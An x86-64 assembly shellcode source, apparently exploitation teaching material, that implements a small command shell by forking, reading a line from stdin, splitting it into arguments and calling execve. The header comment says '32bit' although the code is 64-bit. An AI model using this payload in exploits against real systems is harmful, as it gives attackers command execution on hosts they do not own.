;;;  Evan Jensen 32bit shell emulating shellcode
;;; 
;;;  RDI, RSI, RDX, RCX, R8, and R9 then stack
	
	%include "short64.s"
	%include "syscall.s"
	%define BUFFERLEN 0x1f8

	global main

main:

	do_fork:
	push byte fork
	pop rax
	SYSTEM_CALL
	test rax,rax
	jz child
parent:
	push wait4
	pop rax
	xor rdi,rdi		;pid
	xor rsi,rsi		;status
	xor rdx,rdx		;options
	xor rcx,rcx		;struct rusage*=NULL
	SYSTEM_CALL		;wait(0,0,0,0);
	jmp main

child:	
	cld
get_input:
	xor rax,rax
	cdq
	mov dx,BUFFERLEN        ;size of read
	sub rsp,rdx		;make some room on the stack
	mov rsi,rsp		;use new stack space as buffer for read
	xor rdi,rdi		;fd
	mov al,read	
	SYSTEM_CALL		;read into stack buffer
	
	mov rbp,rax		;save len of str_read
	test rax,rax		;we must read more than 0 bytes
	jz do_exit 		;synchronous IO or GTFO
	mov byte [rax+rsp-1],0	;replace newline with nullbyte
	push rax		;save strlen on the stack
	

	;; let's parse the arguments here
	pop rcx			;return of read pushed by get_input
	push byte " "		;delimiter
	pop rax			;we're going to inline a strchr
	mov rbx,rsp		;rbx is the buffer
	xor rdx,rdx
	add rsp,BUFFERLEN	;rsp is now going to be argv
add_token: 	;; calculate the pointer to push
	
	mov rsi,rbp		;number of chars in buffer
	sub rsi,rcx		;subtract number of chars left in buffer
				;rcx is modified by the repne scasb instruction
 	
	lea rdi,[rbx + rsi]  	;rdi points to current token
	mov [rsp+rdx*8], rdi 	;save the current token pointer building argv
	inc rdx			;increment index into argv
	
	
	repne scasb
	
	mov rsi,rbp
	sub rsi,rcx
	mov byte[rbx+rsi-1],0	;null terminate each token (strtok)
	
	test rcx,rcx
	jz exec
	
	jmp short add_token
	
exec:
	xor rax,rax
	mov [rsp+rdx*8],rax
	cdq

	mov al,execve
	mov rdi,rbx
	mov rsi,rsp
	;; rdx=null
	SYSTEM_CALL		;execve(cmd,args,environ=NULL);
	
do_exit:;; exit nicely if anything fails
	push byte exit
	pop rax
	xor rdi,rdi
	SYSTEM_CALL